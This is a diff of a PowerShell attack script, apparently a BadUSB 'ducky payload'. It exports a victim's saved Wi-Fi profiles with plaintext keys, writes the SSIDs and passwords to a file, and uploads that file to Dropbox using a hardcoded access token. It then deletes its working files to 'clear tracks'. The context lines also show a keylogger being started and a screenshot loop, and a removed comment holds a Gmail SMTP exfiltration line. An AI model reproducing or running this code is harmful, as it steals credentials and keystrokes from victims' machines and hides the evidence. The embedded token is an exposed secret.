@@ -7,7 +7,7 @@ param (
 [Alias("f")]
 [string]$SourceFilePath
 ) 
-$DropBoxAccessToken = "sl.BalnnUrv3WnJH4zt7mEdwfqvrs3fNi0ox5U0ezFPBhVjMrUI4nlBkqGsJxYtcXEpaX5JyAW1Z6sGOKjRHYO39Lny2c0VJ-WY4NbOZtdk7AuzZ8WSGKwFjIgGjVO1iJpBP-7SzDk"
+$DropBoxAccessToken = "sl.BalnnUrv3WnJH4zt7mEdwfqvrs3fNi0ox5U0ezFPBhVjMrUI4nlBkqGsJxYtcXEpaX5JyAW1Z6sGOKjRHYO39Lny2c0VJ-WY4NbOZtdk7AuzZ8WSGKwFjIgGjVO1iJpBP-7SzDk"   # Replace with your DropBox Access Token
 $outputFile = Split-Path $SourceFilePath -leaf
 $TargetFilePath="/$outputFile"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -21,6 +21,33 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 }
 
 
+
+
+
+
+
+# All the files will be saved in this directory
+$p = "C:\wipass"
+mkdir $p
+cd $p
+
+
+# Get all saved wifi password
+netsh wlan export profile key=clear
+dir *.xml |% {
+$xml=[xml] (get-content $_)
+$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
+Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
+}
+
+
+"$env:computername-wificapture.txt" | DropBox-Upload2
+
+# Clear tracks
+rm *.xml
+rm *.txt
+cd ..
+rm wipass
 
 
 #requires -Version 2
@@ -102,7 +129,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 Start-KeyLogger
 
 $i = 0
-while($i -lt 10){
+while($i -lt 5){
 
   Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
@@ -146,39 +173,3 @@ foreach($filePath in $paths) {
 
 
 
-
-
-# All the files will be saved in this directory
-$p = "C:\wipass"
-mkdir $p
-cd $p
-
-
-# Get all saved wifi password
-netsh wlan export profile key=clear
-dir *.xml |% {
-$xml=[xml] (get-content $_)
-$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
-Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
-}
-
-
-"$env:computername-wificapture.txt" | DropBox-Upload2
-
-#$PC_NAME = "$env:computername"
-#$SUBJECT = "Wifi Password Grabber - " + $PC_NAME
-#$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " are in the attached file."
-#$ATTACH = "wifipass.txt"
-
-#Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
-
-
-# Clear tracks
-rm *.xml
-rm *.txt
-cd ..
-rm wipass
-
-
-# remove ducky payload
-#rm d.ps1
